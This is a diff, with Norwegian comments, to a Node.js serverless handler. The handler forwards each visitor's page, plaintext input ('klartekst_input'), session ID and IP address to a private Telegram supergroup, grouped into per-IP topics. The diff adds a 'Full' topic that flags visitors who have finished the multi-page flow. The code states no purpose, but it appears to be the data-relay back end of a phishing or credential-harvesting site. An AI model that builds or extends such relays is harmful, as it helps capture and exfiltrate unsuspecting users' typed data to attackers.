@@ -8,22 +8,24 @@ const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Supergruppe ID (må v�
 // Cache for å lagre mapping mellom IP-adresse og topic/message_thread_id
 // I produksjon kan du bruke en database i stedet
 const ipToTopicMap = new Map();
+const ipToFullTopicMap = new Map();
+
+function getFullTopicName(ipAddress) {
+  return `Full: ${ipAddress}`;
+}
 
 /**
- * Sjekker om et topic allerede eksisterer for en IP-adresse
- * Sjekker gjennom alle topics i supergruppen (med paginering)
+ * Sjekker om et topic med gitt navn allerede eksisterer i supergruppen
  */
-async function findExistingTopicForIP(ipAddress) {
+async function findExistingTopicByName(topicName) {
   try {
-    const topicName = `IP: ${ipAddress}`;
     let offset = 0;
     const limit = 100;
     let hasMore = true;
 
-    // Sjekk gjennom alle topics med paginering
     while (hasMore) {
       const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getForumTopics`;
-      
+
       const response = await fetch(telegramApiUrl, {
         method: 'POST',
         headers: {
@@ -38,25 +40,22 @@ async function findExistingTopicForIP(ipAddress) {
 
       if (!response.ok) {
         const errorData = await response.json().catch(() => ({}));
-        // Hvis API ikke støtter getForumTopics eller feiler, returner null
         console.log(`getForumTopics feilet: ${errorData.description || response.statusText}`);
         return null;
       }
 
       const result = await response.json();
-      
+
       if (result.ok && result.result && result.result.topics) {
-        // Søk etter et topic med samme navn
         const existingTopic = result.result.topics.find(
           topic => topic.name === topicName
         );
-        
+
         if (existingTopic) {
-          console.log(`Fant eksisterende topic for IP ${ipAddress}: ${existingTopic.message_thread_id}`);
+          console.log(`Fant eksisterende topic "${topicName}": ${existingTopic.message_thread_id}`);
           return existingTopic.message_thread_id;
         }
 
-        // Sjekk om det er flere topics å hente
         if (result.result.topics.length < limit) {
           hasMore = false;
         } else {
@@ -66,10 +65,73 @@ async function findExistingTopicForIP(ipAddress) {
         hasMore = false;
       }
     }
-    
+
     return null;
   } catch (error) {
-    console.error(`Feil ved søk etter eksisterende topic for IP ${ipAddress}:`, error);
+    console.error(`Feil ved søk etter topic "${topicName}":`, error);
+    return null;
+  }
+}
+
+async function findExistingTopicForIP(ipAddress) {
+  return findExistingTopicByName(`IP: ${ipAddress}`);
+}
+
+/**
+ * Oppretter et nytt forum-topic i supergruppen
+ */
+async function createForumTopic(topicName, iconColor = 0x6FB9F0) {
+  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;
+
+  const response = await fetch(telegramApiUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      name: topicName,
+      icon_color: iconColor,
+    }),
+  });
+
+  if (!response.ok) {
+    const errorData = await response.json();
+
+    if (errorData.description && errorData.description.includes('already exists')) {
+      console.log(`Topic "${topicName}" eksisterer allerede, søker etter det...`);
+      const existingTopicId = await findExistingTopicByName(topicName);
+      if (existingTopicId) {
+        return existingTopicId;
+      }
+    }
+
+    if (errorData.error_code === 400) {
+      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
+    }
+    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
+  }
+
+  const result = await response.json();
+  console.log(`Opprettet nytt topic "${topicName}": ${result.result.message_thread_id}`);
+  return result.result.message_thread_id;
+}
+
+async function getOrCreateTopicByName(topicName, iconColor = 0x6FB9F0) {
+  const existingTopicId = await findExistingTopicByName(topicName);
+  if (existingTopicId) {
+    return existingTopicId;
+  }
+
+  try {
+    return await createForumTopic(topicName, iconColor);
+  } catch (error) {
+    console.error(`Kunne ikke opprette topic "${topicName}":`, error);
+
+    if (error.message && error.message.includes('already exists')) {
+      return await findExistingTopicByName(topicName);
+    }
+
     return null;
   }
 }
@@ -79,81 +141,37 @@ async function findExistingTopicForIP(ipAddress) {
  * Hvis det er en ny IP, oppretter vi et nytt topic i supergruppen
  */
 async function getOrCreateTopicForIP(ipAddress) {
-  // Først sjekk om vi har det i cache (for denne invokasjonen)
   if (ipToTopicMap.has(ipAddress)) {
     return ipToTopicMap.get(ipAddress);
   }
 
-  // Sjekk om et topic allerede eksisterer i supergruppen
-  const existingTopicId = await findExistingTopicForIP(ipAddress);
-  if (existingTopicId) {
-    ipToTopicMap.set(ipAddress, existingTopicId);
-    return existingTopicId;
+  const topicId = await getOrCreateTopicByName(`IP: ${ipAddress}`, 0x6FB9F0);
+  if (topicId) {
+    ipToTopicMap.set(ipAddress, topicId);
+  }
+  return topicId;
+}
+
+/**
+ * Oppretter eller henter "Full"-topic når brukeren har fullført flyten
+ */
+async function getOrCreateFullTopicForIP(ipAddress) {
+  if (ipToFullTopicMap.has(ipAddress)) {
+    return ipToFullTopicMap.get(ipAddress);
   }
 
-  // Hvis ingen eksisterende topic, opprett et nytt
-  try {
-    const topicId = await createTopicForIP(ipAddress);
-    ipToTopicMap.set(ipAddress, topicId);
-    return topicId;
-  } catch (error) {
-    console.error(`Kunne ikke opprette topic for IP ${ipAddress}:`, error);
-    
-    // Hvis feilen indikerer at topic allerede eksisterer, prøv å finne det igjen
-    if (error.message && error.message.includes('already exists')) {
-      console.log(`Topic eksisterer allerede for IP ${ipAddress}, søker på nytt...`);
-      const existingTopicId = await findExistingTopicForIP(ipAddress);
-      if (existingTopicId) {
-        ipToTopicMap.set(ipAddress, existingTopicId);
-        return existingTopicId;
-      }
-    }
-    
-    // Fallback: bruk null (ingen topic) hvis opprettelse feiler
-    return null;
+  const topicId = await getOrCreateTopicByName(getFullTopicName(ipAddress), 0x8EEE98);
+  if (topicId) {
+    ipToFullTopicMap.set(ipAddress, topicId);
   }
+  return topicId;
 }
 
 /**
  * Oppretter et nytt topic i supergruppen for en IP-adresse
  */
 async function createTopicForIP(ipAddress) {
-  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/createForumTopic`;
-  
-  const response = await fetch(telegramApiUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      name: `IP: ${ipAddress}`,
-      icon_color: 0x6FB9F0, // Blå farge
-    }),
-  });
-
-  if (!response.ok) {
-    const errorData = await response.json();
-    
-    // Hvis topic allerede eksisterer (selv om vi ikke fant det), prøv å finne det igjen
-    if (errorData.description && errorData.description.includes('already exists')) {
-      console.log(`Topic for IP ${ipAddress} eksisterer allerede, søker etter det...`);
-      const existingTopicId = await findExistingTopicForIP(ipAddress);
-      if (existingTopicId) {
-        return existingTopicId;
-      }
-    }
-    
-    // Hvis topics ikke er støttet, returner null
-    if (errorData.error_code === 400) {
-      throw new Error('Topics ikke støttet - sjekk at gruppen er en supergruppe med topics aktivert');
-    }
-    throw new Error(`Kunne ikke opprette topic: ${errorData.description || response.statusText}`);
-  }
-
-  const result = await response.json();
-  console.log(`Opprettet nytt topic for IP ${ipAddress}: ${result.result.message_thread_id}`);
-  return result.result.message_thread_id;
+  return createForumTopic(`IP: ${ipAddress}`, 0x6FB9F0);
 }
 
 /**
@@ -222,6 +240,35 @@ function formatTelegramMessage(data, isNewIPAddress = false) {
   return message;
 }
 
+function formatCompletionMessage(data, isNewFullTopic = false) {
+  const { page, event_description, klartekst_input, ip_adresse, session_uid } = data;
+
+  let message = '';
+
+  if (isNewFullTopic) {
+    message += `✅ <b>Fullført flyt</b>\n`;
+    message += `📍 <b>IP-adresse:</b> <code>${ip_adresse}</code>\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+  } else {
+    message += `✅ <b>Flyt fullført (oppdatering)</b>\n\n`;
+  }
+
+  message += `📄 <b>Siste side:</b> ${page || 'Ukjent'}\n`;
+  message += `📝 <b>Hendelse:</b> ${event_description || 'Ingen beskrivelse'}\n`;
+
+  if (klartekst_input) {
+    message += `✏️ <b>Input:</b> <code>${klartekst_input}</code>\n`;
+  }
+
+  if (session_uid) {
+    message += `🆔 <b>Session ID:</b> <code>${session_uid}</code>\n`;
+  }
+
+  message += `\n⏰ <b>Tid:</b> ${new Date().toLocaleString('nb-NO', { timeZone: 'Europe/Oslo' })}`;
+
+  return message;
+}
+
 async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Kun POST er tillatt' });
@@ -233,7 +280,7 @@ async function handler(req, res) {
       throw new Error('TELEGRAM_BOT_TOKEN eller TELEGRAM_CHAT_ID er ikke satt i miljøvariabler');
     }
 
-    const { page, event_description, klartekst_input, session_uid: client_session_uid } = req.body;
+    const { page, event_description, klartekst_input, session_uid: client_session_uid, flow_completed } = req.body;
     
     // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
     const forwardedFor = req.headers['x-forwarded-for'];
@@ -268,6 +315,25 @@ async function handler(req, res) {
 
     // Send til Telegram i riktig topic (hvis topicId er null, sendes det til hovedkanalen)
     await sendToTelegram(TELEGRAM_CHAT_ID, message, topicId);
+
+    // Ekstra "Full"-topic når brukeren har fullført flyten (page5/page6)
+    if (flow_completed) {
+      const isNewFullTopic = !ipToFullTopicMap.has(ip_adresse);
+      const fullTopicId = await getOrCreateFullTopicForIP(ip_adresse);
+
+      if (fullTopicId) {
+        const completionMessage = formatCompletionMessage({
+          page,
+          event_description,
+          klartekst_input,
+          ip_adresse,
+          session_uid,
+        }, isNewFullTopic);
+
+        await sendToTelegram(TELEGRAM_CHAT_ID, completionMessage, fullTopicId);
+        console.log(`Fullføringsmelding sendt til topic "${getFullTopicName(ip_adresse)}" for IP: ${ip_adresse}`);
+      }
+    }
 
     console.log(`Data sendt til Telegram for IP: ${ip_adresse}`);
 
